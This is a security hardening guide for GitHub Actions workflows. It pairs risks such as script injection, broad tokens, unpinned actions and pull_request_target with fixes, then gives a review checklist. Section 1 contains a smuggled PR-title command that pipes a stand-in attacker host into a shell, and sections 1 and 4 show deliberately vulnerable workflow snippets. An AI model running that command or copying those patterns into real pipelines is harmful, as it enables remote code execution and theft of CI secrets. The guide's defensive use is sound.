# Security hardening for GitHub Actions

Each item is one risk, then the fix. Run through the checklist at the bottom on every PR that
touches `.github/workflows/`.

---

## 1. Script injection via untrusted context

**Risk.** `${{ }}` is substituted before the shell runs, so a PR title like
`"; curl -s <ATTACKER_HOST> | sh; #` becomes a command line executed with the job's token.

```yaml
# bad — attacker-controlled string lands in the shell
- name: Echo the title
  run: echo "${{ github.event.issue.title }}"
```

```yaml
# good — context goes through env, the shell quotes it
- name: Echo the title
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "$ISSUE_TITLE"
```

Rules that follow from this:
- Any field from `github.event` (PR title/body/branch, commit message, issue body, review
  comment, discussion body, head repo URL) is attacker-controlled on `pull_request`,
  `issues`, `pull_request_review`, and `issue_comment` triggers.
- `env:` indirection plus `"$VAR"` quoting fixes `run:` blocks. Steps that only pass a value to an
  action's `with:` may interpolate directly — no shell parses it.
- Never use `${{ }}` inside `shell:` selection, `if:` operand names, or step names that later feed
  a script.

## 2. Default token permissions

**Risk.** With no `permissions:` block, `GITHUB_TOKEN` inherits the repository's broad default
(`read-write` on many orgs), so one compromised job can rewrite source or read every other secret.

```diff
 name: CI
 on: [push]
+permissions:
+  contents: read

 jobs:
   publish:
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write
```

- The top-level block is the floor; a job-level block overrides it for that job only.
- Request the scope on the job that needs it, never globally.
- Use real scope names (`contents`, `packages`, `actions`, `security-events`, `id-token`,
  `deployments`, `issues`, `pull-requests`); an invented scope fails closed, which is safe but confusing.
- Set the org and repo default to "repository permissions: read-only" so a forgotten block fails
  closed, not open.

## 3. Pin third-party actions to a SHA

**Risk.** `uses: some-org/action@v2` follows a mutable tag; a compromised or republished tag runs
attacker code on your runner with your token.

```yaml
# bad — mutable tag, anyone who controls the repo can move it
- uses: <OWNER>/<ACTION>@v2

# good — immutable commit, human-readable tag in the comment
- uses: <OWNER>/<ACTION>@<FULL_SHA>  # <TAG>
```

- Verify the SHA maps to the release commit you intend, not just that it is 40 hex characters.
- `actions/*` are first-party and may use majors.
- Keep SHAs current with Dependabot:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

- An unpinned `uses:` with a container reference needs the same treatment: `image: alpine@sha256:<DIGEST>`.

## 4. `pull_request_target` runs in the base context

**Risk.** `pull_request_target` (and `workflow_run`) get a write token and base-repo secrets, and
then execute whatever the workflow does. Add `ref: refs/pull/N/merge` and the workflow is running
untrusted code with write credentials — the classic exfiltration path.

```yaml
# bad — untrusted code, write token
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.number }}/merge
      - run: npm test
```

- Prefer `pull_request` for anything that builds PR code; accept that fork PRs get a read-only
  token and no secrets, and design around it.
- If you truly need the event (a comment bot, a labeler), do not check out the PR, and gate on the
  actor's association (`OWNER`, `MEMBER`, `COLLABORATOR`) before any privileged step.
- Audit existing workflows for this event before adding secrets to the repo.

## 5. Secrets handling

**Risk.** Anything a runner can read, a compromised workflow can send somewhere. Masking hides the
value from logs; it does not stop exfiltration.

- Scope credentials to an `environment:` (`production`, `staging`) so a fork PR or a branch build
  cannot see them at all.
- Pass named secrets into reusable workflows, not `secrets: inherit`, unless the callee is under
  the same trust boundary.
- `${{ }}` is not allowed in `env:` **keys**, only values. Build keys from static names.
- Never `echo`, `set -x`, or `env | cat` a secret. On self-hosted runners masked values leak from
  step-debug output and runner diagnostics.
- Do not write secrets into files that get archived, cached, or uploaded as artifacts.
- Names only in the workflow file; the values live in GitHub, never in the repo, logs, or commit output.

## 6. Cache poisoning

**Risk.** Caches are shared state keyed by branch and ref. A job with access to `main`'s cache can
inject a payload that later builds restore and execute.

- Restore caches only in jobs that cannot be reached by untrusted code with write capability.
- Scope cache keys with a static prefix plus a lockfile hash
  (`key: ${{ runner.os }}-<CACHE_PREFIX>-${{ hashFiles('package-lock.json') }}`); never build a key
  from a PR title or branch name.
- Do not fall back to a broader partial key for a job whose result reaches production artifacts.
- Build caches (`type=gha`, `mode=max`) push only from the branch builds that own them.

## 7. Self-hosted runners

**Risk.** A runner that survives jobs keeps source, tokens, caches, and build artifacts on disk, so
one malicious PR leaves a backdoor that the next, unrelated job inherits.

- Prefer ephemeral runners that are destroyed after one job.
- If a runner must persist: one repository per runner, no shared filesystem, network-egress
  restricted, host patched on a fixed cycle.
- Never mix private-repo jobs and public-repo jobs on the same self-hosted runner.
- Ephemeral or not, a self-hosted runner is inside your network: treat its egress as a privilege.

## 8. Artifacts and logs

**Risk.** `upload-artifact` output is downloadable by anyone with repository read access and is
retained by default for 90 days.

- Set `retention-days:` to the shortest window that serves the debugging need.
- Never package `.env`, kubeconfig, cloud credentials, generated keys, or database dumps.
- Do not use artifacts as the delivery mechanism for production secrets.
- Check `actions/upload-artifact` and any `if: always()` upload for paths that include config files
  pulled in by a wildcard.

---

## Review checklist

Run on every PR that adds or edits a workflow.

- [ ] Top-level `permissions:` block present, starting from `contents: read`.
- [ ] Write scopes appear only on the jobs that need them, and each is justified in the PR body.
- [ ] No `github.event.*` value interpolated directly into a `run:` block.
- [ ] Every third-party action pinned to a full commit SHA, tag in the trailing comment.
- [ ] No `pull_request_target` / `workflow_run` that checks out or runs PR code without a recorded decision.
- [ ] Cloud access uses OIDC, or the long-lived-key deviation is named.
- [ ] Secrets scoped to environments; reusable workflows receive named secrets, not `inherit`.
- [ ] Cache keys built from static prefixes and lockfile hashes only.
- [ ] Artifacts have a `retention-days:` and no secret-bearing paths.
- [ ] Placeholders listed for the human, `actionlint` run, result line in the PR description.
